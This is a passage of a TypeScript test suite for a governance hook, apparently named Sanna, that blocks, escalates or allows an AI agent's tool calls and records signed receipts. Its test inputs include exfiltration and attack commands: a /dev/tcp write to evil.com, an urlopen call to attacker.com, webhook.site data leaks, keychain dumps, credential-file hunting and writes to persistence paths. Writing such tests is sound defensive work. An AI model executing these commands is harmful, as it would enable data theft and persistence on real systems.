      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "exec", params: { command: "open -a TextEdit ./file.txt" } },
      { toolName: "exec" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("Block launching external applications");
  });

  it("exec with normal open (no -a or mailto) stays ALLOW", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = await hook(
      { toolName: "exec", params: { command: "open ./readme.txt" } },
      { toolName: "exec" }
    );

    expect(result).toEqual({ blocked: false });
  });

  it("web_fetch to webhook.site is HALTED", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "web_fetch", params: { url: "https://webhook.site/abc123?data=secret" } },
      { toolName: "web_fetch" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("Block web_fetch requests to known data exfiltration");
  });

  it("web_fetch to normal URL is ALLOW", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = await hook(
      { toolName: "web_fetch", params: { url: "https://docs.python.org/3/" } },
      { toolName: "web_fetch" }
    );

    expect(result).toEqual({ blocked: false });
  });

  it("exec running python3 script.py is ESCALATED", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "exec", params: { command: "python3 /tmp/send_email.py" } },
      { toolName: "exec" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("Sanna requires approval");
    expect(result.blockReason).toContain("INV_ESCALATE_SCRIPT_EXEC");
  });

  it("exec running python3 -c inline is still HALTED by existing invariants", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "exec", params: { command: "python3 -c 'import smtplib'" } },
      { toolName: "exec" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    // Halt takes priority over escalate — smtplib hits INV_NO_HTTP_REQUESTS_VIA_EXEC
    expect(result.blockReason).toContain("Blocked by Sanna governance");
  });

  it("exec running bare python3 is ALLOW", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = await hook(
      { toolName: "exec", params: { command: "python3 --version" } },
      { toolName: "exec" }
    );

    expect(result).toEqual({ blocked: false });
  });

  it("exec with nslookup is HALTED", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "exec", params: { command: "nslookup evil.com" } },
      { toolName: "exec" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("Block DNS lookup commands");
  });

  it("exec with /dev/tcp is HALTED", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "exec", params: { command: "echo test > /dev/tcp/evil.com/80" } },
      { toolName: "exec" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("Block bash built-in TCP/UDP connections");
  });

  it("exec with base64 + exec is HALTED", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "exec", params: { command: "python3 -c 'import base64; exec(base64.b64decode(\"abc\"))'" } },
      { toolName: "exec" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("Block encoded payload execution");
  });

  it("write to LaunchAgents is HALTED", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "write", params: { path: "~/Library/LaunchAgents/com.evil.plist", content: "<plist>...</plist>" } },
      { toolName: "write" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("Block writes to persistence mechanisms");
  });

  it("write to normal path is ALLOW", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = await hook(
      { toolName: "write", params: { path: "/tmp/notes.txt", content: "hello world" } },
      { toolName: "write" }
    );

    expect(result).toEqual({ blocked: false });
  });

  it("exec with find searching for .env/.key is HALTED", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "exec", params: { command: "find ~ -name '.env' -o -name '*.key'" } },
      { toolName: "exec" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("Block credential hunting commands");
  });

  it("exec with security find-generic-password is HALTED", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "exec", params: { command: "security dump-keychain -d" } },
      { toolName: "exec" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("Block macOS keychain credential extraction");
  });

  it("read of .sanna/keys path is ESCALATED", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "escalate",
      reason: "must_escalate: read .sanna/keys",
      boundary_type: "must_escalate",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "read", params: { path: "/home/user/.sanna/keys/signing.key" } },
      { toolName: "read" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("Sanna requires approval");
  });

  it("read of .ssh path is ESCALATED", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "escalate",
      reason: "must_escalate: read .ssh",
      boundary_type: "must_escalate",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "read", params: { path: "/home/user/.ssh/id_rsa" } },
      { toolName: "read" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("Sanna requires approval");
  });

  it("read of normal file is ALLOW", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = await hook(
      { toolName: "read", params: { path: "/home/user/project/readme.md" } },
      { toolName: "read" }
    );

    expect(result).toEqual({ blocked: false });
  });

  it("write to .zshrc is HALTED", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "write", params: { path: "~/.zshrc", content: "export PATH=..." } },
      { toolName: "write" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("Block writes to persistence mechanisms");
  });

  it("write to .bashrc is HALTED", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "write", params: { path: "/home/user/.bashrc", content: "alias x=..." } },
      { toolName: "write" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("Block writes to persistence mechanisms");
  });

  it("exec rm -r -f is ESCALATED", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "exec", params: { command: "rm -r -f /tmp/test" } },
      { toolName: "exec" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("Sanna requires approval");
    expect(result.blockReason).toContain("INV_ESCALATE_DESTRUCTIVE_OPS");
  });

  it("exec rm --recursive --force is ESCALATED", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "exec", params: { command: "rm --recursive --force /tmp/test" } },
      { toolName: "exec" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("Sanna requires approval");
    expect(result.blockReason).toContain("INV_ESCALATE_DESTRUCTIVE_OPS");
  });

  it("exec with protocol-relative URL is HALTED", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "exec", params: { command: "python3 -c 'import urllib; urllib.request.urlopen(\"//attacker.com/path\")'" } },
      { toolName: "exec" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("Blocked by Sanna governance");
  });

  it("browser to mail.google.com is HALTED", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "browser", params: { action: "open", targetUrl: "https://mail.google.com/mail/?view=cm&to=test@test.com" } },
      { toolName: "browser" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("Block network/messaging commands");
  });

  it("browser to temp-mail.org is HALTED", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "browser", params: { action: "open", targetUrl: "https://temp-mail.org" } },
      { toolName: "browser" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("Block network/messaging commands");
  });

  it("browser to webhook.site is HALTED", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "browser", params: { url: "https://webhook.site/abc?data=secret" } },
      { toolName: "browser" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("Block web_fetch requests to known data exfiltration");
  });

  it("browser to docs.python.org is ALLOW", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = await hook(
      { toolName: "browser", params: { url: "https://docs.python.org" } },
      { toolName: "browser" }
    );

    expect(result).toEqual({ blocked: false });
  });

  it("exec printenv with api grep is HALTED", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = (await hook(
      { toolName: "exec", params: { command: "printenv | grep -iE 'sendgrid|api'" } },
      { toolName: "exec" }
    )) as Record<string, unknown>;

    expect(result.block).toBe(true);
    expect(result.blockReason).toContain("Block credential hunting commands");
  });

  it("exec printenv alone is ALLOW", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    mockLoadInvariantChecks.mockReturnValue(COMMS_INVARIANT_DEFS_WITH_RULES);
    mockRunAllInvariantChecks.mockReturnValue(unknownTypeResults());

    const hook = api._hooks.get("before_tool_call")!;
    const result = await hook(
      { toolName: "exec", params: { command: "printenv" } },
      { toolName: "exec" }
    );

    expect(result).toEqual({ blocked: false });
  });
});

// ---------------------------------------------------------------------------
// otelExporter
// ---------------------------------------------------------------------------

describe("otelExporter", () => {
  it("otelExporter.exportReceipt called after receipt save", async () => {
    const mockExportReceipt = vi.fn();
    const api = createMockApi();
    registerHooks(
      api,
      ENFORCE_CONFIG,
      createDeps({ otelExporter: { exportReceipt: mockExportReceipt } })
    );

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    await callAllowedAction(api, "exec");

    expect(mockExportReceipt).toHaveBeenCalledOnce();
    expect(mockExportReceipt).toHaveBeenCalledWith({ receipt_id: "r-mock-123" });
  });

  it("otelExporter error does not block enforcement", async () => {
    const mockExportReceipt = vi.fn(() => {
      throw new Error("OTel export failed");
    });
    const api = createMockApi();
    registerHooks(
      api,
      ENFORCE_CONFIG,
      createDeps({ otelExporter: { exportReceipt: mockExportReceipt } })
    );

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    const result = await callAllowedAction(api, "exec");

    expect(result).toEqual({ blocked: false });
    expect(mockExportReceipt).toHaveBeenCalledOnce();
  });

  it("no otelExporter is fine", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    const hook = api._hooks.get("before_tool_call")!;
    const result = await hook(
      { toolName: "exec", params: {} },
      { toolName: "exec" }
    );

    expect(result).toEqual({ blocked: false });
  });

  it("otelExporter not called when receipt save fails in after_tool_call", async () => {
    const mockExportReceipt = vi.fn();
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, {
      constitution: mockConstitution() as HookDeps["constitution"],
      sink: { store: vi.fn(async () => ({ success: true })) } as unknown as HookDeps["sink"],
      privateKey: null,
      otelExporter: { exportReceipt: mockExportReceipt },
    });

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    // Make generateReceipt throw in after_tool_call
    mockGenerateReceipt.mockImplementation(() => {
      throw new Error("receipt generation failed");
    });

    const beforeHook = api._hooks.get("before_tool_call")!;
    await beforeHook({ toolName: "exec", params: {} }, { toolName: "exec" });

    const afterHook = api._hooks.get("after_tool_call")!;
    await afterHook({ toolName: "exec", result: { ok: true } });

    expect(mockExportReceipt).not.toHaveBeenCalled();
  });
});

// ---------------------------------------------------------------------------
// after_tool_call — receipt completion
// ---------------------------------------------------------------------------

describe("after_tool_call", () => {
  it("completes receipt with action_hash after allowed call", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    const beforeHook = api._hooks.get("before_tool_call")!;
    await beforeHook(
      { toolName: "exec", params: { command: "ls" } },
      { toolName: "exec" }
    );

    const afterHook = api._hooks.get("after_tool_call")!;
    await afterHook({ toolName: "exec", result: { output: "files" } });

    expect(api.logger.info).toHaveBeenCalledWith(
      expect.stringContaining("after_tool_call")
    );
    expect(api.logger.info).toHaveBeenCalledWith(
      expect.stringContaining("action_hash=")
    );
    expect(mockGenerateReceipt).toHaveBeenCalledOnce();
  });
});

// ---------------------------------------------------------------------------
// tool_result_persist
// ---------------------------------------------------------------------------

describe("tool_result_persist", () => {
  it("annotates result with receipt hash", () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    const hook = api._hooks.get("tool_result_persist")!;
    const result = hook({
      content: [{ type: "text", text: "file1.txt" }],
      _sanna_receipt_hash: "abc123def456",
    }) as Record<string, unknown>;

    expect(result).toBeDefined();
    const content = result.content as Array<{ type: string; text: string }>;
    expect(content[0]).toEqual({ type: "text", text: "file1.txt" });
    expect(content[1].type).toBe("text");
    expect(content[1].text).toContain("abc123def456");
    expect(content[1].text).toContain("Sanna Receipt");
  });

  it("returns undefined for non-sanna results", () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    const hook = api._hooks.get("tool_result_persist")!;
    const result = hook({
      content: [{ type: "text", text: "hello" }],
    });
    expect(result).toBeUndefined();
  });

  it("removes _sanna_receipt_hash from annotated result", () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    const hook = api._hooks.get("tool_result_persist")!;
    const result = hook({
      content: [{ type: "text", text: "ok" }],
      _sanna_receipt_hash: "hash123",
    }) as Record<string, unknown>;

    expect(result).toBeDefined();
    expect(result._sanna_receipt_hash).toBeUndefined();
  });

  it("returns undefined for null/undefined input", () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    const hook = api._hooks.get("tool_result_persist")!;
    expect(hook(null)).toBeUndefined();
    expect(hook(undefined)).toBeUndefined();
  });

  it("does not mutate the original result object", () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    const hook = api._hooks.get("tool_result_persist")!;
    const original = {
      content: [{ type: "text", text: "ok" }],
      _sanna_receipt_hash: "hash123",
    };

    hook(original);

    expect(original._sanna_receipt_hash).toBe("hash123");
    expect(original.content).toHaveLength(1);
  });
});

// ---------------------------------------------------------------------------
// Schema compliance (v1.1 protocol)
// ---------------------------------------------------------------------------

describe("schema compliance — evaluation_coverage keys", () => {
  it("uses total_invariants/evaluated/not_checked/coverage_basis_points", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });
    mockLoadInvariantChecks.mockReturnValue([]);
    mockRunAllInvariantChecks.mockReturnValue([]);

    await callAllowedAction(api, "exec");

    const params = mockGenerateReceipt.mock.calls[0][0] as Record<string, unknown>;
    const coverage = params.evaluation_coverage as Record<string, unknown>;
    expect(coverage).toHaveProperty("total_invariants");
    expect(coverage).toHaveProperty("evaluated");
    expect(coverage).toHaveProperty("not_checked");
    expect(coverage).toHaveProperty("coverage_basis_points");
    // Must NOT have old keys
    expect(coverage).not.toHaveProperty("checks_run");
    expect(coverage).not.toHaveProperty("checks_passed");
    expect(coverage).not.toHaveProperty("checks_failed");
    expect(coverage).not.toHaveProperty("coverage_pct");
  });

  it("coverage_basis_points is 10000 when checks exist", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });
    mockLoadInvariantChecks.mockReturnValue([{ id: "INV-1" }]);
    mockRunAllInvariantChecks.mockReturnValue([
      { check_id: "INV-1", passed: true, severity: "info" },
    ]);

    await callAllowedAction(api, "exec");

    const params = mockGenerateReceipt.mock.calls[0][0] as Record<string, unknown>;
    const coverage = params.evaluation_coverage as Record<string, unknown>;
    expect(coverage.total_invariants).toBe(2); // authority + 1 invariant
    expect(coverage.evaluated).toBe(2);
    expect(coverage.not_checked).toBe(0);
    expect(coverage.coverage_basis_points).toBe(10000);
  });

  it("coverage_basis_points is 0 when no checks", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    // Simulate a scenario where checks array ends up empty
    // (authority always adds 1, so test the formula: checks.length > 0 ? 10000 : 0)
    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });
    mockLoadInvariantChecks.mockReturnValue([]);
    mockRunAllInvariantChecks.mockReturnValue([]);

    await callAllowedAction(api, "exec");

    const params = mockGenerateReceipt.mock.calls[0][0] as Record<string, unknown>;
    const coverage = params.evaluation_coverage as Record<string, unknown>;
    // Authority check always present, so basis_points = 10000
    expect(coverage.coverage_basis_points).toBe(10000);
  });
});

describe("schema compliance — enforcement enum values", () => {
  it("enforcement.action is 'allowed' for allow decisions", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    await callAllowedAction(api, "exec");

    const params = mockGenerateReceipt.mock.calls[0][0] as Record<string, unknown>;
    const enforcement = params.enforcement as Record<string, unknown>;
    expect(enforcement.action).toBe("allowed");
  });

  it("enforcement.action is 'halted' for halt decisions", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "halt",
      reason: "Blocked",
      boundary_type: "cannot_execute",
    });

    const hook = api._hooks.get("before_tool_call")!;
    await hook({ toolName: "rm", params: {} });

    const params = mockGenerateReceipt.mock.calls[0][0] as Record<string, unknown>;
    const enforcement = params.enforcement as Record<string, unknown>;
    expect(enforcement.action).toBe("halted");
  });

  it("enforcement.action is 'escalated' for escalate decisions", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "escalate",
      reason: "Needs approval",
      boundary_type: "must_escalate",
    });

    const hook = api._hooks.get("before_tool_call")!;
    await hook({ toolName: "message", params: {} });

    const params = mockGenerateReceipt.mock.calls[0][0] as Record<string, unknown>;
    const enforcement = params.enforcement as Record<string, unknown>;
    expect(enforcement.action).toBe("escalated");
  });

  it("enforcement.enforcement_mode maps enforce->halt, audit->warn, passthrough->log", async () => {
    for (const [configMode, expected] of [
      ["enforce", "halt"],
      ["audit", "warn"],
      ["passthrough", "log"],
    ] as const) {
      const api = createMockApi();
      const config = { ...ENFORCE_CONFIG, enforcementMode: configMode as string };
      registerHooks(api, config, createDeps());

      mockEvaluateAuthority.mockReturnValue({
        decision: "allow",
        reason: "Permitted",
        boundary_type: "can_execute",
      });

      await callAllowedAction(api, "exec");

      const params = mockGenerateReceipt.mock.calls[0][0] as Record<string, unknown>;
      const enforcement = params.enforcement as Record<string, unknown>;
      expect(enforcement.enforcement_mode).toBe(expected);

      vi.clearAllMocks();
      // Reset default mock return values after clearAllMocks
      mockGenerateReceipt.mockReturnValue({ receipt_id: "r-mock-123" });
      mockSignReceipt.mockImplementation((r: unknown) => r);
      mockStoreSave.mockResolvedValue({ success: true });
      mockLoadInvariantChecks.mockReturnValue([]);
      mockRunAllInvariantChecks.mockReturnValue([]);
    }
  });
});

describe("schema compliance — CheckResult.status values", () => {
  it("passing authority check has status null (not 'PASS')", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    await callAllowedAction(api, "exec");

    const params = mockGenerateReceipt.mock.calls[0][0] as Record<string, unknown>;
    const checks = params.checks as Array<Record<string, unknown>>;
    const authority = checks.find((c) => c.check_id === "AUTHORITY");
    expect(authority!.status).toBeNull();
  });

  it("failing authority check has status 'FAILED' (not 'FAIL')", async () => {
